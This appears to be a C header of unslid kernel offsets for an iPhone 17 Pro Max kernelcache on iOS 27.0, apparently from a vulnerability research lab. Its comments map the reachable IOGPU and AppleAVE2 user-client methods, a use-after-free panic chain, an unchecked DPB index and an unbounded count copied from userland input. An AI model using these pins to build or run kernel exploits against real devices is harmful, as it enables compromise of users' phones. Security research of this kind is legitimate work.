//
//  T8150_24A435_LabOffsets.h
//  iPhone18,2 / T8150 / 17 Pro Max / iOS 27.0 24A435
//
//  Unslid pins from kernelcache.release.iPhone18,2 (note 171 / 24A437 text
//  twin). static_base is the T8150 PPL/SPTM map, never 0xFFFFFFF007004000.
//  IOGPU / NECP / AMFI / AVE / ANE request layout stay 0 until re-derived.
//  iPhone18,1 and iPhone18,3 stay LabSkuUnknown (different kcaches).
//  Sibling 24A* on iPhone18,2 is LabSkuT8150_other (static_base only).
//
//  Live panic-full 2026-10-19 18:45:55 (watchdog, not kread):
//    Fileset KC UUID 5CE4B53C-D756-700C-65DE-72837093EB53
//    Kernel UUID A5A62616-FA9C-337E-9C97-41BB2D427C63
//    SPTM-820.0.22 UUID 325C14BC-3EFA-33A3-9E5C-7A7049E321CD
//    TXM UUID 9F80F5EC-09C8-3E9F-A196-13A6250C04E0
//    iBoot mBoot-20457.2.37  socId 8150 rev 11
//    text exec base 0xfffffe004b0b4000 = STATIC_BASE + 0x440b0000 (that boot only).
//

#ifndef T8150_24A435_LabOffsets_h
#define T8150_24A435_LabOffsets_h

#define T8150_24A435_STATIC_BASE            0xFFFFFE0007004000ULL
#define T8150_24A435_ANE_CHECKANDPREWIRE    0xFFFFFE0008C16A88ULL
#define T8150_24A435_ANE_MAPLOCKED          0xFFFFFE0008C17190ULL
#define T8150_24A435_ANE_MAPREQUEST         0xFFFFFE0008C19708ULL
#define T8150_24A435_ANE_MAPALLOC           0xFFFFFE0008C0D324ULL
#define T8150_24A435_ANE_ALLOC_SIZE         0x10B8u
#define T8150_24A435_ANE_ALLOC_CLEAR        0x10A0u
#define T8150_24A435_ANE_RECORD_OFF         0x90u
/* Trailer at +0x1080 (beta-4 decompile; 0x90+255*16). 254-in = 255 records = in-bounds. */
#define T8150_24A435_ANE_TRAILER_OFF        0x1080u
#define T8150_24A435_ANE_TABLE_ENTRIES      255u


/* ===== THE 17-NIGHT PINS (2026-11-01; agents 1-3 + p143's device rows) =====
   All unslid VAs on the 24A435 cache (base 0xfffffe0007004000, flat law).
   Read-only pins: the tap code, not LabOff() consumers yet. */

/* --- the ROCKET DOOR (IOGPUDeviceUserClient, IOGPUFamily) ---
   open law: ONLY type 1 = the DeviceUC (type 0 = 2c2; type 0x21 = MemoryInfo).
   gate 0xa024d94 (vtable row 0x82f6378): asyncRef!=null -> 2c2;
   [uc+0x100] bit0 = armed (0 -> 0x2d8 NotReady); [uc+0x103] bit0 SET =
   RESTRICTED = the stubbed table B. OUR app = bit0 clear = table A full. */
#define T8150_24A435_IOGPU_SMETHODS_A       0xFFFFFE00082F64B0ULL  /* 56 rows stride 0x18 */
#define T8150_24A435_IOGPU_SMETHODS_B       0xFFFFFE00082F69F0ULL  /* rows 15-0x36 = the 2e2 stub */
#define T8150_24A435_IOGPU_GATE             0xFFFFFE000A024D94ULL
#define T8150_24A435_IOGPU_NEWUC            0xFFFFFE000A02299CULL  /* s_submit = row 0x19 (NOT 0x24!) */
#define T8150_24A435_IOGPU_QUEUECREATE_FN   0xFFFFFE000A021EE8ULL  /* row 0, scIn=0, 64B out */
#define T8150_24A435_IOGPU_OWNERMINT        0xFFFFFE000A024974ULL  /* deviceUserClientStart */
/* the submit's userland law: scalars {qid(1-based=out+0x18!), count, stride,
   unused}; structIn = count*stride EXACTLY; stride == *(u32*)([q+0x530]+0x260);
   entries +0x10/+0x18 u64 +0x20 u32-gate; out scalar[0] = *(q+0x520)
   (0 = clean, 8 = the fail sentinel). */
#define T8150_24A435_IOGPU_QUEUE_STRIDE_OFF 0x260u   /* off the q+0x530 config */

/* --- the AVE2 INTAKE (AppleAVE2UserClient; CVE-2026-112705 cluster) ---
   sMethods 16 rows STRIDE 0x28 {method, scIn@+8, stIn@+0xc, stOut@+0x14}. */
#define T8150_24A435_AVE2_SMETHODS          0xFFFFFE0007F902D0ULL
#define T8150_24A435_AVE2_FN_IOOPEN         0xFFFFFE00088D24E4ULL  /* row0: stIn 0x768 / stOut 0x38 */
#define T8150_24A435_AVE2_FN_IOCLOSE        0xFFFFFE00088D2FFCULL  /* row1: 0x28/0x20 */
#define T8150_24A435_AVE2_FN_IOCONFIG       0xFFFFFE00088D3804ULL  /* row2: 0x38/0x20; mask u64 @stIn+0x30 RAW */
#define T8150_24A435_AVE2_FN_IOPREPARE      0xFFFFFE00088D40C4ULL  /* row3: 0x12c08/0x20 */
#define T8150_24A435_AVE2_FN_IOSTART        0xFFFFFE00088D4B9CULL  /* row4: 0x12c18/0x150 */

/* --- the PANIC/UAF cluster (the repro's true chain; KCS-slide law!) ---
   unslid via the KernelCache-slide row (NOT the Kernel-slide row = KCS+0x8000!).
   TRUE (pc,lr) = 0x872b188 / 0x88410c4 (bit-identical across boots). */
#define T8150_24A435_AVE2_LISTINIT_LEAF     0xFFFFFE000872B180ULL
#define T8150_24A435_AVE2_SOT_RESET         0xFFFFFE0008840FECULL  /* the garbage-slot write site */
#define T8150_24A435_AVE2_CODEC_TEARDOWN    0xFFFFFE00087913B4ULL  /* 3 slots @ ctx+0x147b0 */
#define T8150_24A435_AVE2_DPB_INIT          0xFFFFFE0008735E34ULL  /* inline pool ctx+0x2e0 0x80 */
#define T8150_24A435_AVE2_MANAGEDPB         0xFFFFFE0008738514ULL  /* idx [ctx+0xb64]*0x80 unchecked */
/* --- the params-blob decode (2026-11-01): the DPB count's intake cluster ---
    VERBATIM: cfg+0x55c == structIn+0x55c (NO remap) = sGOP.iNumOfTemporalLayer;
    +0x560 = its duplicate; the count-copy = UNBOUNDED (walls below). */
#define T8150_24A435_AVE2_GOP_D5VERIFIER    0xFFFFFE000873358CULL  /* HARD 0xe00002bc; <2 needs long-term */
#define T8150_24A435_AVE2_GOP_CHECKINFO     0xFFFFFE000878E670ULL  /* the [0,8] assert — LOG-GATED */
#define T8150_24A435_AVE2_GOP_COUNTSET      0xFFFFFE0008735FD4ULL  /* cfg+0x55c -> ctx+0xb60 (THE COUNT) */
#define T8150_24A435_AVE2_GOP_CLAMP16       0xFFFFFE00088BA5DCULL  /* m_MaxDpbSizeForThisProfileAndLevel clamp */
#define T8150_24A435_AVE2_GOP_DEDUPE        0xFFFFFE00088BA790ULL  /* copies +0x560 -> +0x55c; caller 0x889c234 */
#define T8150_24A435_AVE2_POOLINIT_CALLER   0xFFFFFE000889F894ULL  /* per-FRAME pool init (6-cond gate) */

#endif /* T8150_24A435_LabOffsets_h */
